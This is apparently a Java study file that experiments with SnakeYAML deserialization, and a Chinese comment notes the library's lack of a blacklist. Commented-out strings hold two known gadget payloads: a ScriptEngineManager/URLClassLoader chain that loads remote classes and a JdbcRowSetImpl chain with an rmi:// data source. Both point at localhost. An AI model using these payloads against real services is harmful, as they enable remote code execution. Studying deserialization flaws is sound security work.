package learn;

import org.yaml.snakeyaml.Yaml;

public class test {
    /**
     * 特点在于它没有黑名单，不能设置私有属性，不能使用构造方法触发的 gadgets。
     * @param args
     */
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        //Person person = new Person();
        //person.name="giao";
        //person.age=18;
        //String dump = yaml.dump(person);//序列化
        //System.out.println(dump);

        //String poc1 = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:2333/\"]]]]";
        //
        //String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2333/exp', autoCommit: true}";
        String data = "!!learn.Person [\"18\"]";//调用构造方法
        System.out.println(yaml.load(data));

    }
}
